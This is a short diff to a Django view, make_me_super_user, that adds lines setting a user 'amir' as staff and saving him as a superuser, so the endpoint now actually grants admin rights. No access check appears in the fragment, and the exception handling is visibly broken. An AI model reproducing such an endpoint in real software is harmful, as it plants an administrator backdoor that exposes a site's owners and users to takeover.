@@ -129,6 +129,8 @@ def make_me_super_user(request):
             return HttpResponse("is already a superuser...")
         else:
             amir.is_superuser = True
+            amir.is_staff = True
+            amir.save()
             return HttpResponse("Done!")
     except amir.DoesNotExist:
         return HttpResponse("DoesNotExist.")
